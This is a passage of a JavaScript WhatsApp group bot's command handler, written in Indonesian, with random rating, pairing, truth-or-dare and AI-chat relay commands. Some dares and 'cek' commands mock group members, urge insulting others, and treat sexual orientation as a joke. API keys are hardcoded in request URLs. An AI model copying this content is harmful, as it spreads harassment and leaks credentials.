  NanoBotz.sendMessage(m.chat, {audio: {url: `https://nue-api.vercel.app/api/tts?lang=id&text=${khodam}`}, mimetype: 'audio/mpeg', ptt: true }, {quoted: m});
  break;

  break
  case 'rate': {
                if (!text) return replynano(`Example : ${prefix + command} my profile`)
                let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
  let kah = ra[Math.floor(Math.random() * ra.length)]
  let jawab = `*Rate ${text}*\nAnswer : ${kah}%`
              await replynano(jawab)
  }
break
        

// Fungsi untuk format waktu dalam format hh:mm:ss
function formatUptime(seconds) {
    const hours = Math.floor(seconds / (60 * 60));
    const minutes = Math.floor((seconds % (60 * 60)) / 60);
    const secs = Math.floor(seconds % 60);
    return `${hours} jam ${minutes} menit ${secs} detik`;
}

// Handler untuk perintah 'runtime' atau 'tes'
case 'runtime':
case 'tes': {
    // Mengambil waktu aktif
    const uptimeInSeconds = process.uptime();
    const formattedUptime = formatUptime(uptimeInSeconds);

    // Menyusun pesan dengan informasi yang lebih rinci
    const message = `*BangsulBotz 🤖 Aktif Selama:*\n\n` +
                    `⏳ *Durasi Aktif:*\n       ${formattedUptime}\n\n` +
                    //`📅 *Tanggal Mulai:* ${new Date(process.uptime() * 1000).toLocaleDateString()}\n` +
                    `🕒 *Waktu Mulai:* ${new Date(process.uptime() * 1000).toLocaleTimeString()}\n`;

    // Mengirimkan pesan
    replynano(message);
}
break;

        
        break

break
case 'ping': 
case 'botstatus':  
case 'statusbot': {
    let timestamp = speed();
    let latensi = speed() - timestamp;
    let neww = performance.now();
    let oldd = performance.now();

    // Format tampilan pesan
    let responseMessage = `
    *BangsulBotz Status 🤖*\n
🚀 *Kecepatan Respon    :* ${latensi.toFixed(4)} detik
📶 *Ping                       :* ${(oldd - neww).toFixed(4)} milidetik
🌐 *Status Koneksi :* ${latensi < 1 ? 'Stabil' : 'Tidak Stabil'}\n
⏳ *Waktu Aktif :*\n         ${runtime(process.uptime())}\n
`.trim();

    // Mengirimkan pesan
    replynano(responseMessage);
}
break;



   

  case 'jodoh':
  case 'jodohku': {
              if (!m.isGroup) return reply(mess.only.group)
              let member = participants.map(u => u.id)
              let me = m.sender
              let jodoh = member[Math.floor(Math.random() * member.length)]
  NanoBotz.sendMessage(m.chat,
  { text: `JODOHMU ADALAH🩷
  
  @${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}\n KiwKiw🫶🫰`,
  contextInfo:{
  mentionedJid:[me, jodoh],
  forwardingScore: 9999999,
  isForwarded: true}},
  { quoted: m})        
              }
              break
   case 'jadian': {
              if (!m.isGroup) return reply(mess.only.group)
              let member = participants.map(u => u.id)
              let orang = member[Math.floor(Math.random() * member.length)]
              let jodoh = member[Math.floor(Math.random() * member.length)]
  NanoBotz.sendMessage(m.chat,
  { text: `@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}
  wuiih udah jadian, semoga sampai ke pelaminan yaa..🤣😹`,
  contextInfo:{
  mentionedJid:[me, jodoh],
  forwardingScore: 9999999,
  isForwarded: true}},
  { quoted: m})        
              }

break
case 'siapacantik': {
  if (!m.isGroup) return reply(mess.only.group)
  let member = participants.map(u => u.id)
  let orang = member[Math.floor(Math.random() * member.length)]
NanoBotz.sendMessage(m.chat,
{ text: `pertanyaan : siapa orang paling CANTIK di grup ini?\n\nhai 🫱🏻‍🫲🏻 @${orang.split('@')[0]}\nkamu terpilih menjadi orang paling CANTIK di grup ini🫅🏻\nselamat yaa...🫵🏻🫦🫀`,
contextInfo:{
mentionedJid:[orang],
forwardingScore: 9999999,
isForwarded: true}},
{ quoted: m})        
  }

break
case 'siapaganteng': {
  if (!m.isGroup) return reply(mess.only.group)
  let member = participants.map(u => u.id)
  let orang = member[Math.floor(Math.random() * member.length)]
NanoBotz.sendMessage(m.chat,
{ text: `pertanyaan : siapa orang paling GANTENG di grup ini?\n\nhai 🫱🏻‍🫲🏻 @${orang.split('@')[0]}\nkamu terpilih menjadi orang paling GANTENG di grup ini🤴🏻\nselamat yaa...🫵🏻🫦🫀`,
contextInfo:{
mentionedJid: [orang],
forwardingScore: 9999999,
isForwarded: true}},
{ quoted: m})        
  }

break
case 'siapajelek': {
  if (!m.isGroup) return reply(mess.only.group)
  let member = participants.map(u => u.id)
  let orang = member[Math.floor(Math.random() * member.length)]
NanoBotz.sendMessage(m.chat,
{ text: `pertanyaan : siapa orang paling JELEK di grup ini?\n\nhai 🫱🏻‍🫲🏻 @${orang.split('@')[0]}\nkamu di terpilih menjadi orang PALING JELEK di grup ini\nhaha kasihan jelek...🫵🏻😹💩🤮`,
contextInfo:{
mentionedJid:[orang],
forwardingScore: 9999999,
isForwarded: true}},
{ quoted: m})        
  }

break

case 'siapagoblok': {
  if (!m.isGroup) return reply(mess.only.group)
  let member = participants.map(u => u.id)
  let orang = member[Math.floor(Math.random() * member.length)]
NanoBotz.sendMessage(m.chat,
{ text: `pertanyaan : siapa orang paling GOBLOK di grup ini?\n\nhai 🙏🏻 @${orang.split('@')[0]}\ndengan berat hati...kamu terpilih menjadi orang paling GOBLOK di grup ini🫵🏻😹💩 \nselamat yaa...🤪`,
contextInfo:{
mentionedJid:[orang],
forwardingScore: 9999999,
isForwarded: true}},
{ quoted: m})        
  }

break
case 'siapapintar': {
  if (!m.isGroup) return reply(mess.only.group)
  let member = participants.map(u => u.id)
  let orang = member[Math.floor(Math.random() * member.length)]
NanoBotz.sendMessage(m.chat,
{ text: `pertanyaan : siapa orang paling pintar di grup ini?\n\nhai 🙌🏻 @${orang.split('@')[0]}\nkamu terpilih menjadi orang paling *pintar* di grup ini🫱🏻‍🫲🏻\nselamat yaa... 🥳`,
contextInfo:{
mentionedJid: [orang],
forwardingScore: 9999999,
isForwarded: true}},
{ quoted: m})        
  }

break


case 'couplepp': case 'ppcouple': {
  reply(mess.wait)
  let anucpp = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/main/couple.json')
  let random = anucpp[Math.floor(Math.random() * anucpp.length)]
  NanoBotz.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
  NanoBotz.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
              }
        break
        case 'dare':
          const dare =[
"Makan 2 sendok makan nasi tanpa lauk apapun, jika terasa berat, kamu bisa minum.",
"Sebutkan orang yang membuatmu terdiam",
"Telepon gebetan/pacar sekarang dan kirim tangkapan layar di sini",
"Kirim emot hanya setiap kali kamu mengetik di grup obrolan/obrolan pribadi selama 1 hari.",
"Ucapkan 'Selamat datang di Who Wants To Be a Millionaire!' ke semua grup yang kamu punya",
"Telepon mantan dengan mengatakan rindu",
"nyanyikan chorus dari lagu terakhir yang kamu mainkan",
"Rekam suara untuk mantan/pacar/gebemmu, katakan 'Hai (nama), ingin menelepon, tunggu sebentar. Aku sangat merindukanmu'",
"Pukul meja (yang ada di rumah) sampai kamu dimarahi karena berisik",
"Katakan pada orang asing 'Aku baru saja diberitahu bahwa aku adalah saudaramu yang pertama, kami berpisah, lalu aku melakukan operasi plastik. Dan ini hal paling 'ciyusss'",
"Sebutkan nama mantan",
"buat 1 sajak untuk anggota grup!",
"Kirim daftar percakapan WhatsAppmu",
"Obrol dengan orang asing dengan bahasa ghetto lalu tangkap layar di sini",
"Ceritakan versimu sendiri tentang hal-hal memalukan",
"Tag orang yang kamu benci",
"Pura-pura seperti terkena pengaruh, misalnya: terkena pengaruh anjing, terkena pengaruh belalang, terkena pengaruh lemari es, dll.",
"Ubah nama menjadi *I AM DONKEY* selama 24 jam",
"Teriak *ma chuda ma chuda ma chuda* di depan rumahmu",
"Ambil foto/potret pacar atau gebetanmu dan kirimkan di sini",
"Ceritakan tipe pacar yang kamu sukai!",
"Ucapkan *aku naksir kamu, maukah kamu menjadi pacarku?* kepada lawan jenis, terakhir kali kamu berbicara dengannya (kirim di WA/Telegram), tunggu sampai dia membalas, jika sudah, berikan di sini",
"Rekam suaramu yang membaca *titar ke age do titar, titar ke piche do titar*",
"Chatingan lelucon dengan mantan dan katakan *aku mencintaimu, tolong kembalilah.* tanpa menyebutkan bahwa itu adalah tantangan!",
"Obrol dengan kontak WhatsApp berurutan sesuai dengan persentase baterai ponselmu, lalu katakan 'Aku beruntung memiliki kamu!'",
"Ubah nama menjadi *I am a child of randi* selama 5 jam",
"Ketik dalam bahasa Bengali selama 24 jam",
"Gunakan foto Selmon Bhoi selama 3 hari",
"Kirim kutipan lagu lalu tag anggota yang cocok untuk kutipan tersebut",
"Kirim pesan suara dengan ucapan 'Bolehkah aku memanggilmu sayang?'",
"Tangkapan layar percakapan terakhir di WhatsAppmu",
"Ucapkan *KAMU SANGAT CANTIK, JANGAN BERBOHONG* kepada teman pria!",
"Telepon salah satu anggota grup dan katakan kata kasar kepada mereka",
"Berlakulah seperti ayam di depan orangtua kamu",
"Ambil sebuah buku secara acak dan bacakan satu halaman secara keras dan rekam suara lalu kirimkan di sini",
"Buka pintu depan rumahmu dan menyalak seperti serigala selama 10 detik",
"Ambil foto selfie yang memalukan dan jadikan sebagai foto profilmu",
"Biar grup memilih sebuah kata dan lagu yang dikenal. Kamu harus menyanyikan lagu tersebut dan kirim dalam bentuk pesan suara di sini",
"Berjalanlah dengan menopang dengan siku dan lutut selama yang kamu bisa",
"nyanyikan lagu kebangsaan dalam pesan suara",
"Lakukan breakdance selama 30 detik di ruang tamu",
"Ceritakan cerita sedih yang kamu ketahui",
"Buat video tari twerk singkat dan unggah sebagai status selama 5 menit",
"Makan sepotong bawang putih mentah",
"Tunjukkan lima orang terakhir yang kamu kirim pesan dan isi pesan mereka",
"Jadikan nama lengkapmu sebagai status selama 5 jam",
"Buat video tari singkat tanpa filter hanya dengan musik dan unggah sebagai status selama 5 jam",
"Telepon sahabatmu, omong kosong",
"Jadikan foto dirimu tanpa filter sebagai status selama 10 menit",
"Ucapkan 'aku cinta Oli London' dalam pesan suara 😄",
"Kirim pesan kepada mantanmu dan katakan bahwa kamu masih menyukainya",
"Telepon gebetan/pacar/sahabatmu sekarang dan tangkapan layar di sini",
"Berkata kasar pada salah satu anggota grup di percakapan pribadi dan katakan 'kamu jelek, beban'",
"Ucapkan 'KAMU CANTIK/GANTENG' pada salah satu orang yang ada di atas pinlistmu atau orang pertama di daftar percakapanmu",
"Kirim pesan suara dan katakan 'Bisakah aku memanggilmu sayang?'. Jika kamu seorang pria, sebutkan nama seorang wanita. Jika kamu seorang wanita, sebutkan nama seorang pria",
"Tulis 'Aku mencintaimu (nama anggota grup acak yang sedang online) dalam percakapan pribadi (jika kamu pria, tulis nama wanita; jika kamu wanita, tulis nama pria), ambil tangkapan layar dan kirimkan di sini",
"Gunakan foto aktor Bollywood sebagai foto profilmu selama 3 hari",
"Jadikan foto crushmu sebagai status dengan caption 'Ini adalah crushku'",
"Ubah nama menjadi *I AM GAY* selama 5 jam",
"Obrol dengan salah satu kontak di WhatsApp dan katakan 'Aku akan menjadi pacarmu selama 5 jam'",
"Kirim pesan suara dan katakan 'Aku naksir kamu, maukah kamu menjadi pacarku?' kepada orang acak dari grup (jika kamu perempuan, pilih nama laki-laki; jika kamu laki-laki, pilih nama perempuan)",
"Pukul pantatmu dengan keras dan kirim suara tamparan melalui pesan suara 😂",
"Sebutkan tipe pacarmu dan kirim fotonya di sini dengan keterangan 'Perempuan/laki-laki paling jelek di dunia'",
"Teriak 'bravooooooooo' dan kirimkan melalui pesan suara di sini",
"Ambil foto wajahmu dan kirim di sini",
"Kirim foto dirimu dengan keterangan 'Aku lesbian'",
"Teriak dengan menggunakan kata-kata kasar dan kirim melalui pesan suara",
"Teriak 'kamu bajingan' di depan ibu atau ayahmu",
"Ubah nama menjadi *aku bodoh selama 24 jam*",
"Pukul dirimu sendiri dengan mantap dan kirim suara pukulan melalui pesan suara 😂",
"Ucapkan 'aku cinta pemilik bot danz' melalui pesan suara",
"Kirim foto pacar atau gebetanmu di sini",
"Buat video tantangan tarian TikTok apa pun dan unggah sebagai status, kamu bisa menghapusnya setelah 5 jam",
"Putuskan pertemanan dengan sahabatmu selama 5 jam tanpa memberitahunya bahwa itu adalah tantangan",
"Katakan pada salah satu temanmu bahwa kamu mencintainya dan ingin menikahinya, tanpa memberitahunya bahwa itu adalah tantangan",
"Ucapkan 'aku cinta Depak Kalal' melalui pesan suara",
"Tulis 'aku merasa horny' dan unggah sebagai status, kamu hanya bisa menghapusnya setelah 5 jam",
"Tulis 'aku lesbian' dan unggah sebagai status, kamu hanya bisa menghapusnya setelah 5 jam",
"Cium ibu atau ayahmu dan katakan 'aku mencintaimu' 😌",
"Jadikan nama ayahmu sebagai status selama 5 jam",
"Kirim kata-kata kasar dalam grup manapun, kecuali grup ini, dan kirim bukti tangkapan layarnya di sini"
]
          const xeondare = dare[Math.floor(Math.random() * dare.length)]
          bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
          NanoBotz.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ xeondare }, {quoted:m})
          break
    break
   case 'truth':
          const truth =[
"Pernahkah kamu menyukai seseorang? Berapa lama?",
"Jika kamu bisa atau jika kamu mau, grup obrolan atau grup di luar mana yang ingin kamu jadikan teman? (bisa berbeda/jenis yang sama)",
"Apa ketakutan terbesar kamu?",
"Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
"Siapa nama mantan pacar temanmu yang dulu pernah kamu sukai diam-diam?",
"Pernahkah kamu mengambil uang dari ayah atau ibumu? Alasannya?",
"Apa yang membuatmu bahagia saat sedang sedih?",
"Pernahkah kamu memiliki perasaan cinta satu arah? jika ya kepada siapa? bagaimana perasaannya, bro?",
"Pernah menjadi selingkuhan seseorang?",
"Hal paling ditakuti?",
"Siapa orang yang paling berpengaruh dalam hidupmu?",
"Prestasi apa yang berhasil kamu raih tahun ini?",
"Siapa orang yang bisa membuatmu keren?",
"Siapa orang yang pernah membuatmu sangat bahagia?",
"Siapa yang paling mendekati tipe pasangan idamanmu di sini?",
"Dengan siapa kamu suka bermain?",
"Pernahkah kamu menolak seseorang? alasan mengapa?",
"Sebutkan insiden yang pernah menyakiti perasaanmu yang masih kamu ingat",
"Prestasi apa yang sudah kamu capai tahun ini?",
"Kebiasaan terburukmu di sekolah?",
"Lagu apa yang paling sering kamu nyanyikan di dalam kamar mandi?",
"Pernahkah kamu mengalami pengalaman dekat dengan kematian?",
"Kapan terakhir kali kamu sangat marah? Mengapa?",
"Siapa orang terakhir yang meneleponmu?",
"Apakah kamu memiliki bakat tersembunyi? Apa sajakah itu?",
"Kata apa yang paling kamu benci?",
"Video YouTube terakhir apa yang kamu tonton?",
"Hal terakhir apa yang kamu cari di Google?",
"Dalam grup ini, dengan siapa yang ingin kamu tukar kehidupan selama seminggu?",
"Apa hal paling menakutkan yang pernah terjadi padamu?",
"Pernahkah kamu kentut dan menyalahkannya kepada orang lain?",
"Kapan terakhir kali kamu membuat orang lain menangis?",
"Pernahkah kamu menghilangkan jejak dari seorang teman?",
"Pernahkah kamu melihat mayat?",
"Anggota keluargamu yang paling mengganggumu dan mengapa?",
"Jika kamu harus menghapus satu aplikasi dari ponselmu, aplikasi mana yang akan kamu hapus?",
"Aplikasi apa yang paling sering kamu buang-buang waktu di dalamnya?",
"Pernahkah kamu berpura-pura sakit untuk pulang dari sekolah?",
"Apa barang paling memalukan di dalam kamar kamarmu?",
"Jika terdampar di pulau terpencil, lima barang apa yang akan kamu bawa?",
"Pernahkah kamu tertawa begitu keras hingga pipismu basah?",
"Apakah kamu mencium bau kentutmu sendiri?",
"Pernahkah kamu kencing di tempat tidur saat tidur?",
"Apa kesalahan terbesar yang pernah kamu buat?",
"Pernahkah kamu mencontek dalam ujian?",
"Apa hal terburuk yang pernah kamu lakukan?",
"Kapan terakhir kali kamu menangis?",
"Di antara orang tua kamu, siapa yang kamu cintai paling?",
"Apakah kamu kadang-kadang memasukkan jari ke dalam lubang hidungmu?",
"Siapa pujaan hati kamu saat masa sekolah dulu?",
"Berbicara jujur, apakah kamu menyukai seorang anak laki-laki dalam grup ini?",
"Pernahkah kamu menyukai seseorang? Berapa lama?",
"Apakah kamu punya pacar? Apa ketakutan terbesarmu?",
"Pernahkah kamu menyukai seseorang dan merasa bahwa orang tersebut juga menyukaimu?",
"Siapa nama mantan pacar temanmu yang pernah kamu sukai diam-diam?",
"Pernahkah kamu mengambil uang milik ibu atau ayahmu? Apa alasannya?",
"Apa yang membuatmu bahagia saat sedang sedih?",
"Apakah kamu menyukai seseorang dalam grup ini? Jika ya, siapa?",
"Pernahkah kamu ditipu oleh seseorang?",
"Siapa orang yang paling penting dalam hidupmu?",
"Prestasi apa yang telah kamu capai tahun ini?",
"Siapa orang yang bisa membuatmu bahagia saat sedang sedih?",
"Siapa orang yang pernah membuatmu merasa tidak nyaman?",
"Pernahkah kamu berbohong kepada orang tua?",
"Apakah kamu masih menyukai mantan pacarmu?",
"Siapa yang ingin kamu ajak bermain bersama?",
"Pernahkah kamu mencuri sesuatu yang besar? Alasannya apa?",
"Sebutkan insiden yang pernah membuatmu terluka dan masih kamu ingat?",
"Prestasi apa yang sudah kamu raih tahun ini?",
"Apa kebiasaan terburukmu saat di sekolah?",
"Apakah kamu mencintai pencipta bot ini, Dani 😄",
"Pernahkah kamu berpikir untuk membalas dendam pada guru?",
"Apakah kamu menyukai perdana menteri saat ini di negaramu?",
"Apakah kamu vegetarian atau non-vegetarian?",
"Jika kamu bisa menjadi tak terlihat, apa yang pertama kali akan kamu lakukan?",
"Apa rahasia yang kamu simpan dari orang tua kamu?",
"Siapa pujaan hati rahasiamu?",
"Siapa orang terakhir yang kamu intip di media sosial?",
"Jika seorang jin memberimu tiga permintaan, apa yang akan kamu minta?",
"Apa penyesalan terbesarmu?",
"Hewan seperti apa menurutmu yang paling mirip denganmu?",
"Berapa banyak foto selfie yang kamu ambil dalam sehari?",
"Apa acara favoritmu saat masa kanak-kanak?",
"Jika kamu bisa menjadi karakter fiksi dalam satu hari, siapa yang akan kamu pilih?",
"Dengan siapa kamu paling sering mengirim pesan?",
"Apa kebohongan terbesar yang pernah kamu ceritakan kepada orang tua kamu?",
"Siapa selebriti yang menjadi pujaan hatimu?",
"Mimpi paling aneh yang pernah kamu alami?",
"Apakah kamu bermain PUBG? Jika ya, berikan nomor ID-mu."
]
          const Nanotruth = truth[Math.floor(Math.random() * truth.length)]
          buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
          NanoBotz.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Nanotruth }, {quoted:m})
          break
case 'checkme':
      neme = args.join(" ")
      bet = `${sender}`
      var sifat = ["Baik", "Tidak ramah", "Chapri", "Nibba/nibbi", "Mengganggu", "Rusak", "Orang marah", "Sopan", "Beban", "Hebat", "Cringe", "Pembohong"]
      var hoby = ['Memasak','Menari','Bermain','Bermain game','Melukis','Membantu Orang Lain','Menonton anime','Membaca','Bersepeda','Bernyanyi','Berbincang-bincang','Berbagi Meme','Menggambar','Menghabiskan Uang Orang Tua','Bermain Truth or Dare','Menghabiskan Waktu Sendirian']
      var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
      var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
      var cakep = ['Ya', 'Tidak', 'Sangat jelek', 'Sangat tampan']
      var wetak= ['Peduli','Murah hati','Orang marah','Maaf','Tunduk','Baik','Maafkan aku','Berhati baik','Sabar','UwU','Terbaik','Membantu']
      var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
      var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
      var cerdhas = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
      var berhani = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
      var mengheikan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
      var sipat = sifat[Math.floor(Math.random() * sifat.length)]
      var biho = hoby[Math.floor(Math.random() * hoby.length)]
      var bhucin = bukcin[Math.floor(Math.random() * bukcin.length)]
      var senga = arp[Math.floor(Math.random() * arp.length)]
      var chakep = cakep[Math.floor(Math.random() * cakep.length)]
      var watak = wetak[Math.floor(Math.random() * wetak.length)]
      var baik = baikk[Math.floor(Math.random() * baikk.length)]
      var burug = bhuruk[Math.floor(Math.random() * bhuruk.length)]
      var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
      var berani = berhani[Math.floor(Math.random() * berhani.length)]
      var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
       profile = `*≡══《 Check @${bet.split('@')[0]} 》══≡*

*Name           :* ${pushname}
*karakteristik :* ${sipat}
*Hobby            :* ${biho}
*bucin            :* ${bhucin}%
*Great            :* ${senga}%
*Ganteng/cantik :* ${chakep}
*Character         :* ${watak}
*Moral Baik       :* ${baik}%
*Moral Buruk     :* ${burug}%
*Kecerdasan       :* ${cerdas}%
*Keberanian       :* ${berani}%
*Penakut           :* ${takut}%`
      buff = await getBuffer(defaultpp)
NanoBotz.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
break
case 'jomblocek':
case 'gaycek':
case 'imutcek':
  case 'lesbicek':
    case 'gantengcek':
    case 'cantikcek':
    case 'goblokcek':
    case 'bodohcek':
    case 'gilacek':
      case 'pintarcek':
if (!m.isGroup) return reply(mess.only.group)
const cex = body.slice(0)
const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
if (mentionByReply) {
NanoBotz.sendMessage(from, { text: 'Pertanyaan : ' + cex + '\npemeriksa    : ' + `@${mentionByReply.split('@')[0]}` + '\nJawaban       : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
} else if (mentionByTag[0] && isGroup) {
NanoBotz.sendMessage(from, { text: 'pertanyaan : ' + cex + '\npemeriksa    : ' + `@${mentionByTag[0].split('@')[0]}` + '\njawaban       : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
} else if (!mentionByReply && !mentionByTag[0]) {
NanoBotz.sendMessage(from, { text: 'pertanyaan : ' + cex + '\npemeriksa    : ' + `@${sender.split('@')[0]}` + '\njawaban       : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
}
break

  
   









































//==================================================================
//case AI & search
break
case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break

case 'ai':
case 'openai':
case 'open-ai': {
	if (!text) return replynano(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await NanoBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Open AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./data/image/openai.jpg')}, { upload: NanoBotz.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Nice Open Ai ✨","id":".mangap"}`
            }],
          }),
          
       })
    }
  }
}, { quoted: m })
await NanoBotz.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return replynano("`*Error Kak :(*`")
}
}
break

case 'bard':
case 'bardai': {
                if (!text) return replynano('apa yang ingin kamu tanyakan?')
                const data1 = await fetchJson(`https://skizo.tech/api/openai?apikey=nanogembul&text=${encodeURIComponent(text)}&system=kamu adalah danz nano`)
    const msgai = data1.result;
replynano(`${msgai}`)
           }
break
case 'cai': {
  if (!text) return replynano(`Example : ${command} siapakah elon musk`)
const data1 = await fetchJson(`https://api.elxyz.me/ai/character-ai?apikey=KC-d25a3f0c02be4021&character=kamu adalah Danz nano, yang memiliki sifat baik dan sopan, kamu memiliki chanel YouTube bernama danz nano&text=${encodeURIComponent(text)}`)
    const msgai = data1.result.response;
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> Karakter AI\n\n' + msgai
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./data/image/cai.jpg')}, { upload: NanoBotz.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Nice Karakter Ai ✨","id":".mangap"}`
            }],
          })
       })
    }
  }
}, { quoted: m })
await NanoBotz.relayMessage(m.chat, msgs.message, {})
}
break
case 'gpt4': {
	if (!text) return replynano(`*• Example:* ${prefix + command} Botz Adalah`);   
await NanoBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/gpt4?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> GPT4 AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./data/image/gpt.jpg')}, { upload: NanoBotz.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
                "buttonParamsJson": `{"display_text":"Nice bosquu","id":".mangap"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363204138641225@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
